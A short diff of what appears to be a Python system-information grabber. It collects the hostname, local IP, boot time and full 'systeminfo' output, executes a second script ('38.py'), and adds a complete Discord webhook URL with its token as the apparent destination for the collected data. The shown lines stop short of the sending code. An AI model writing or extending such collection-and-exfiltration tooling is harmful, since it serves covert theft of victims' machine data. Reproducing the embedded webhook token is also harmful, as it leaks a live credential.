@@ -45,7 +45,7 @@ computername = socket.gethostname()
 localipaddress = socket.gethostbyname(computername)
 boottime = datetime.fromtimestamp(psutil.boot_time())
 
-url = "WEBHOOK HERE" # PUT WEBHOOK HERE
+url = "WEBHOOK HERE" # https://discord.com/api/webhooks/1416338920907473087/eMm9X2-COmfQyZsgppXkukAMRODoVz1apS4w5UsRL-309eQ40Iz-w7TboOCb9EEa25RS
 
 def ipaddrr():
 
@@ -83,3 +83,4 @@ sys_dir = "Files\ExtraSystemInfo.txt"
 os.system("systeminfo > ExtraSystemInfo.txt")
 shutil.move(sys_file, sys_dir)
 exec(open("38.py").read())
+
